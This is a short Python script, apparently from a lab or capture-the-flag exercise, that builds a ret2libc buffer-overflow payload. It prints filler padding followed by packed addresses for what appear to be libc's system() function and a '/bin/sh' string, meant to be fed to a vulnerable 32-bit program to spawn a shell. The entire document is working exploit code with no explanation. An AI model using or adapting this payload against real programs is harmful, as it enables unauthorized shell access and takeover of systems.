import struct

offset = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHKKKKLLLLOOOOPPPPIIIIUUUUYYYYTTTTEEEEBBBBCCCCDDDD"
system = struct.pack("I", 0xb7ecffb0)
binsh = struct.pack("I", 0xb7fb63bf)

print(offset + system + "junk" + binsh)
